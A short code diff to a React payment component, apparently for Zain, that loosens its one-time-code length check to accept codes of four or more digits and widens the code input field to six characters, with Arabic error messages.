@@ -206,8 +206,8 @@ export default function ZainPayment() {
     const otpCode = otpValues
 
     // Check if OTP length matches selected length
-    if (otpCode.length !== otpLength) {
-      setOtpError(`يجب أن يكون رمز التحقق مكون من ${otpLength} أرقام`)
+    if (otpCode.length <4) {
+      setOtpError(`يجب أن يكون رمز التحقق مكون من 4 او 6 أرقام`)
       return
     }
 
@@ -563,7 +563,7 @@ export default function ZainPayment() {
                   <Input
                     type="tel"
                     inputMode="numeric"
-                    maxLength={1}
+                    maxLength={6}
                     value={otpValues}
                     onChange={(e) => setOtpValues( e.target.value)}
                     className={`w-full h-12 text-center text-sm font-bold border-2 rounded-lg ${
